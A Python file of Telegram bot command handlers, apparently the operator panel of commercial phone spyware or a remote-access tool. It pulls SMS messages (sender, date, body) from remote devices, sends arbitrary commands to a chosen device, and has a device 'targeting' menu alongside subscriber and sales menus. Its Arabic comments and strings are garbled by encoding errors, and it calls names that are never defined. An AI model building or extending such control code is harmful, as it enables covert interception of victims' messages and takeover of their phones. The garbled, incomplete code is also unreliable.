#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Handlers - ูุนุงูุฌุงุช ุฃูุงูุฑ ุงูุจูุช

ูุฐุง ุงูููู ูุญุชูู ุนูู ุฏูุงู ูุนุงูุฌุฉ ุฃูุงูุฑ ุงูุจูุช ูุชูุงุนูุงุช ุงููุณุชุฎุฏู.
"""

import logging
from telegram import Update, InlineKeyboardMarkup
from telegram.ext import CallbackContext

# ุงุณุชูุฑุงุฏ ุงูุฎุฏูุงุช
from services.api_client import get_sms_data, send_command
from services.auth_service import is_authorized, is_owner, is_admin

# ุงุณุชูุฑุงุฏ ููุญุงุช ุงูููุงุชูุญ
from views.keyboards import (
    get_main_keyboard, get_owner_keyboard, get_admin_keyboard,
    OWNER_MAIN_MENU, ADMIN_MAIN_MENU, OWNER_TARGETING_MENU, ADMIN_TARGETING_MENU
)

# ุงุณุชูุฑุงุฏ ุงูุฑุณุงุฆู
from views.messages import get_welcome_message, get_unauthorized_message

logger = logging.getLogger(__name__)


def handle_start(update: Update, context: CallbackContext) -> None:
    """ูุนุงูุฌุฉ ุฃูุฑ ุงูุจุฏุก /start"""
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    logger.info(f"ูุณุชุฎุฏู ุฌุฏูุฏ ุจุฏุฃ ุงูุจูุช: {username} (ID: {user_id})")
    
    # ุงูุชุญูู ูู ุตูุงุญูุฉ ุงููุณุชุฎุฏู
    if not is_authorized(user_id):
        update.message.reply_text(get_unauthorized_message())
        return
    
    # ุชุญุฏูุฏ ููุน ุงููุณุชุฎุฏู ูุฅุฑุณุงู ููุญุฉ ุงูููุงุชูุญ ุงูููุงุณุจุฉ
    if is_owner(user_id):
        keyboard = get_owner_keyboard(OWNER_MAIN_MENU)
        update.message.reply_text(
            get_welcome_message(is_owner=True),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif is_admin(user_id):
        keyboard = get_admin_keyboard(ADMIN_MAIN_MENU)
        update.message.reply_text(
            get_welcome_message(is_owner=False),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )


def handle_help(update: Update, context: CallbackContext) -> None:
    """ูุนุงูุฌุฉ ุฃูุฑ ุงููุณุงุนุฏุฉ /help"""
    user_id = update.effective_user.id
    
    # ุงูุชุญูู ูู ุตูุงุญูุฉ ุงููุณุชุฎุฏู
    if not is_authorized(user_id):
        update.message.reply_text(get_unauthorized_message())
        return
    
    # ุฅุฑุณุงู ุฑุณุงูุฉ ุงููุณุงุนุฏุฉ
    help_text = (
        "๐น *ุฃูุงูุฑ ุงูุจูุช ุงูุฃุณุงุณูุฉ:*\n"
        "/start - ุจุฏุก ุงูุจูุช ูุนุฑุถ ุงููุงุฆูุฉ ุงูุฑุฆูุณูุฉ\n"
        "/help - ุนุฑุถ ูุฐู ุงููุณุงุนุฏุฉ\n"
        "/get_sms - ุงูุญุตูู ุนูู ุฑุณุงุฆู SMS\n"
        "/send_command - ุฅุฑุณุงู ุฃูุฑ ุฅูู ุฌูุงุฒ\n\n"
        "๐ธ *ุงุณุชุฎุฏุงู ุงูุฃุฒุฑุงุฑ:*\n"
        "ููููู ุงุณุชุฎุฏุงู ุงูุฃุฒุฑุงุฑ ุฃุฏูุงู ููุชููู ุจูู ุงูููุงุฆู ุงููุฎุชููุฉ."
    )
    
    # ุชุญุฏูุฏ ููุน ุงููุณุชุฎุฏู ูุฅุฑุณุงู ููุญุฉ ุงูููุงุชูุญ ุงูููุงุณุจุฉ
    if is_owner(user_id):
        keyboard = get_owner_keyboard(OWNER_MAIN_MENU)
    else:
        keyboard = get_admin_keyboard(ADMIN_MAIN_MENU)
    
    update.message.reply_text(
        help_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )


def handle_get_sms(update: Update, context: CallbackContext) -> None:
    """ูุนุงูุฌุฉ ุฃูุฑ ุงูุญุตูู ุนูู ุฑุณุงุฆู SMS"""
    user_id = update.effective_user.id
    
    # ุงูุชุญูู ูู ุตูุงุญูุฉ ุงููุณุชุฎุฏู
    if not is_authorized(user_id):
        update.message.reply_text(get_unauthorized_message())
        return
    
    # ุงุณุชุฏุนุงุก ุฎุฏูุฉ ุงูุญุตูู ุนูู ุฑุณุงุฆู SMS
    try:
        # ูููู ุชูุฑูุฑ ูุนููุงุช ุฅุถุงููุฉ ูู ุณูุงู ุงูุฃูุฑ
        device_id = None
        if context.args and len(context.args) > 0:
            device_id = context.args[0]
        
        # ุงูุญุตูู ุนูู ุฑุณุงุฆู SMS
        sms_data = get_sms_data(device_id)
        
        if not sms_data or len(sms_data) == 0:
            update.message.reply_text("ูุง ุชูุฌุฏ ุฑุณุงุฆู SMS ูุชุงุญุฉ.")
            return
        
        # ุฅุฑุณุงู ุงูุฑุณุงุฆู ูููุณุชุฎุฏู
        for sms in sms_data:
            sms_text = f"๐ฑ *ุฌูุงุฒ:* {sms['device_name']}\n"
            sms_text += f"๐ *ูู:* {sms['sender']}\n"
            sms_text += f"๐ *ุงูุชุงุฑูุฎ:* {sms['date']}\n"
            sms_text += f"๐ *ุงูุฑุณุงูุฉ:*\n{sms['message']}"
            
            update.message.reply_text(sms_text, parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"ุฎุทุฃ ูู ุงูุญุตูู ุนูู ุฑุณุงุฆู SMS: {str(e)}")
        update.message.reply_text(f"ุญุฏุซ ุฎุทุฃ: {str(e)}")


def handle_send_command(update: Update, context: CallbackContext) -> None:
    """ูุนุงูุฌุฉ ุฃูุฑ ุฅุฑุณุงู ุฃูุฑ ุฅูู ุฌูุงุฒ"""
    user_id = update.effective_user.id
    
    # ุงูุชุญูู ูู ุตูุงุญูุฉ ุงููุณุชุฎุฏู
    if not is_authorized(user_id):
        update.message.reply_text(get_unauthorized_message())
        return
    
    # ุงูุชุญูู ูู ูุฌูุฏ ุงููุนููุงุช ุงููุทููุจุฉ
    if not context.args or len(context.args) < 2:
        update.message.reply_text(
            "ุงูุงุณุชุฎุฏุงู ุงูุตุญูุญ: /send_command <device_id> <command>"
        )
        return
    
    device_id = context.args[0]
    command = " ".join(context.args[1:])
    
    try:
        # ุฅุฑุณุงู ุงูุฃูุฑ ุฅูู ุงูุฌูุงุฒ
        result = send_command(device_id, command)
        
        # ุฅุฑุณุงู ูุชูุฌุฉ ุงูุชูููุฐ ูููุณุชุฎุฏู
        if result.get('success'):
            update.message.reply_text(f"ุชู ุฅุฑุณุงู ุงูุฃูุฑ ุจูุฌุงุญ: {command}")
        else:
            update.message.reply_text(f"ูุดู ุฅุฑุณุงู ุงูุฃูุฑ: {result.get('error', 'ุฎุทุฃ ุบูุฑ ูุนุฑูู')}")
    
    except Exception as e:
        logger.error(f"ุฎุทุฃ ูู ุฅุฑุณุงู ุงูุฃูุฑ: {str(e)}")
        update.message.reply_text(f"ุญุฏุซ ุฎุทุฃ: {str(e)}")


def handle_button_press(update: Update, context: CallbackContext) -> None:
    """ูุนุงูุฌุฉ ุงูุถุบุท ุนูู ุงูุฃุฒุฑุงุฑ"""
    query = update.callback_query
    user_id = query.from_user.id
    
    # ุงูุชุญูู ูู ุตูุงุญูุฉ ุงููุณุชุฎุฏู
    if not is_authorized(user_id):
        query.answer("ุบูุฑ ูุตุฑุญ ูู ุจุงุณุชุฎุฏุงู ูุฐุง ุงูุจูุช.")
        return
    
    # ุงุณุชุฎุฑุงุฌ ุงูุจูุงูุงุช ูู ุงูุฒุฑ
    data = query.data
    query.answer()
    
    # ูุนุงูุฌุฉ ุงูุฃุฒุฑุงุฑ ุงููุฎุชููุฉ
    if data == "main_menu":
        if is_owner(user_id):
            keyboard = get_owner_keyboard(OWNER_MAIN_MENU)
            query.edit_message_text(
                "ุงููุงุฆูุฉ ุงูุฑุฆูุณูุฉ ูููุงูู",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            keyboard = get_admin_keyboard(ADMIN_MAIN_MENU)
            query.edit_message_text(
                "ุงููุงุฆูุฉ ุงูุฑุฆูุณูุฉ ููุฃุฏูู",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
    
    # ูุนุงูุฌุฉ ุฃุฒุฑุงุฑ ุงูุงุณุชูุฏุงู
    elif data == "targeting" or data == "ุงุณุชูุฏุงู_ุฌูุงุฒ_ูุญุฏุฏ":
        if is_owner(user_id):
            keyboard = get_owner_keyboard(OWNER_TARGETING_MENU)
            query.edit_message_text(
                "ูุงุฆูุฉ ุงุณุชูุฏุงู ุงูุฃุฌูุฒุฉ",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            keyboard = get_admin_keyboard(ADMIN_TARGETING_MENU)
            query.edit_message_text(
                "ูุงุฆูุฉ ุงุณุชูุฏุงู ุงูุฃุฌูุฒุฉ",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
    
    # ูุนุงูุฌุฉ ุฃุฒุฑุงุฑ ุฅุฏุงุฑุฉ ุงูุฃุฌูุฒุฉ
    elif data == "devices" or data == "ุฅุฏุงุฑุฉ_ุงูุฃุฌูุฒุฉ":
        if is_owner(user_id):
            keyboard = get_owner_keyboard(OWNER_DEVICES_MENU)
            query.edit_message_text(
                "ูุงุฆูุฉ ุฅุฏุงุฑุฉ ุงูุฃุฌูุฒุฉ",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            # ูุงุฆูุฉ ููุงุณุจุฉ ููุฃุฏูู
            query.edit_message_text(
                "ูุงุฆูุฉ ุนุฑุถ ุงูุฃุฌูุฒุฉ",
                reply_markup=get_main_keyboard()
            )
    
    # ูุนุงูุฌุฉ ุจุงูู ุงูุฃุฒุฑุงุฑ
    elif data in ["ุฅุฏุงุฑุฉ_ุงููุดุชุฑููู", "ุฅุฏุงุฑุฉ_ุงููุธุงู", "ุฅุฏุงุฑุฉ_ุงููุจูุนุงุช", "ุงููุณุงุนุฏุฉ_ูุงูุฏุนู",
                 "ุฅุฏุงุฑุฉ_ุงูุนููุงุก", "ุงูุฅุญุตุงุฆูุงุช", "ุงููุณุงุนุฏุฉ"]:
        query.edit_message_text(
            f"ุชู ุงุฎุชูุงุฑ: {data.replace('_', ' ')}",
            reply_markup=get_back_keyboard()
        )
    
    # ุฃุฒุฑุงุฑ ุบูุฑ ูุนุฑููุฉ
    else:
        query.edit_message_text(
            f"ุนุฐุฑุงูุ ูุฐู ุงูููุฒุฉ ุบูุฑ ูุชููุฑุฉ ุญุงููุงู: {data}",
            reply_markup=get_back_keyboard()
        )


def handle_text_message(update: Update, context: CallbackContext) -> None:
    """ูุนุงูุฌุฉ ุงูุฑุณุงุฆู ุงููุตูุฉ"""
    user_id = update.effective_user.id
    
    # ุงูุชุญูู ูู ุตูุงุญูุฉ ุงููุณุชุฎุฏู
    if not is_authorized(user_id):
        update.message.reply_text(get_unauthorized_message())
        return
    
    # ูุนุงูุฌุฉ ุงูุฑุณุงุฆู ุงููุตูุฉ ุงููุฎุชููุฉ
    text = update.message.text
    
    # ููุง ูููู ุฅุถุงูุฉ ุงููุฒูุฏ ูู ุงูููุทู ููุนุงูุฌุฉ ุงูุฑุณุงุฆู ุงููุตูุฉ
    update.message.reply_text(f"ุชู ุงุณุชูุงู ุฑุณุงูุชู: {text}")


def handle_unknown_command(update: Update, context: CallbackContext) -> None:
    """ูุนุงูุฌุฉ ุงูุฃูุงูุฑ ุบูุฑ ุงููุนุฑููุฉ"""
    update.message.reply_text(
        "ุฃูุฑ ุบูุฑ ูุนุฑูู. ุงุณุชุฎุฏู /help ููุญุตูู ุนูู ูุงุฆูุฉ ุงูุฃูุงูุฑ ุงููุชุงุญุฉ."
    )